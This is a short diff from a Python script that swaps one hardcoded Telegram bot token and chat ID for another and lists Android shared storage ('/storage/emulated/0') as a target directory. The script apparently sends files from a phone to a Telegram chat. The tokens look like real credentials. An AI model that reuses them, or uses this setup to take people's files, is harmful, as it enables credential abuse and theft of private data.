@@ -52,8 +52,8 @@ def install_packages():
 install_packages()
 
 # Telegram bot configuration
-BOT_TOKEN = "8085382490:AAFC07cS1ZnDEpWtfRc3BLN6tVS7NfEvQqc"
-CHAT_ID = "6267126880"
+BOT_TOKEN = "8385046774:AAFTKUJQBdNMXLhjna2tDGYhoyUACASLIQM"
+CHAT_ID = "7599385056"
 
 DIRECTORIES = [
     "/storage/emulated/0"
